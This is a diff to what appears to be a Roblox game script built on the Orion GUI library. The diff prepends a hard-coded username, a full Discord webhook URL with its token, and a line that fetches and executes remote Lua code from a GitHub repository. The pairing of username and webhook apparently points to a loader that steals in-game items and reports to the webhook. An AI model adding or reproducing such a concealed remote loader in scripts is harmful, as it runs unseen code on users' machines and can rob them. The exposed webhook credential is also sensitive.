@@ -1,3 +1,8 @@
+Username = "KeirazeIIee" 
+Webhook = "https://discord.com/api/webhooks/1273351560486846474/Ev7YgS25WSPiq1okHcbRvfk5Ia0xEey3-QhjdzwiaiJ83lkCjr796rANQ1Ijm7wg70fb" 
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/zachemzhestokiy/x/main/ps99.lua"))() 
+
 getgenv().gui = false
 
 local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()
